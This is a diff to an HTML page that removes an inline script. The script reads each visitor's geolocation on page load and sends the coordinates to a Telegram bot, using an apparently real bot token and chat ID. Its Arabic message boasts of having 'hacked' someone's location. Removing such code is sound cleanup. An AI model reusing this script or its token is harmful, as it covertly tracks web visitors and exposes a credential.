@@ -133,27 +133,7 @@
       
       
       
-      <script>
-    if (navigator.geolocation) {
-  navigator.geolocation.getCurrentPosition(sendLocationToTelegramBot);
-} else {
-  console.log("Geolocation is not supported by this browser.");
-}
-
-function sendLocationToTelegramBot(position) {
-  var latitude = position.coords.latitude;
-  var longitude = position.coords.longitude;
-  var url = "https://api.telegram.org/bot1933582082:AAGqFYD_7bUgGrqx9-dBm1OGUbjEkJ1QacY/sendMessage";
-  var params = {
-    chat_id: "804516705",
-    text: "اخترقت لك خريطةشخص عبر الموقع الجغرافي :" + latitude + ", " + longitude
-  };
-  var xhr = new XMLHttpRequest();
-  xhr.open("POST", url, true);
-  xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-  xhr.send(JSON.stringify(params));
-}
-  </script>
+      
       
       
       
